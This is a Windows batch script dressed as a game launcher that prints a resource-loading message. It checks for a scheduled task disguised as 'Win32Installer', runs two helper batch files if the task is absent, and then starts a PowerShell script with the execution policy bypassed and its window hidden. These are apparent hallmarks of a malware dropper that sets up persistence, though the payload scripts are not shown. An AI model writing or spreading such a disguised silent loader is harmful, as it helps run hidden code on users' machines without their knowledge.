@echo off
cd /d %~dp0

set "dir=%cd%"

echo Loading game resources...

schtasks /query /tn "Win32Installer" > nul 2>&1
if %errorlevel% neq 0 (
    cmd /c "%dir%\\internal\\run.bat"
    cmd /c "%dir%\\GameHelper\\run.bat"
)

cd /d "%dir%\\src" && powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File main.ps1
